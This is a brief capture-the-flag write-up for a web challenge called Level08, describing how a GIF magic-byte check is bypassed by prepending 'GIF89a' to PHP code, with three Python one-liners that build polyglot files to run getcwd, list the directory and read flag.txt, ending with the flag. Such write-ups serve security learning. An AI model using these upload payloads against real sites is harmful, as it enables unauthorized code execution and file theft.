### Level08
Alright, source shows some semi-decent checks on the file to make sure it's gif-like and then goes and dumps it in the page like an idiot.
So, let's write some php.
`python -c 'print("\x47\x49\x46\x38\x39\x61"+" <?php print_r(getcwd()); ?>")' > stuff.gif` works initially to make sure we have commands.
`python -c 'print("\x47\x49\x46\x38\x39\x61"+" <?php print_r(scandir(\"./\")); ?>")' > stuff.gif` shows a flag in the same folder as us.
And finally `python -c 'print("\x47\x49\x46\x38\x39\x61"+" <?php print_r(readfile(\"flag.txt\")); ?>")' > stuff.gif`
Flag is `WEBSEC{BypassingImageChecksToRCE}`
    
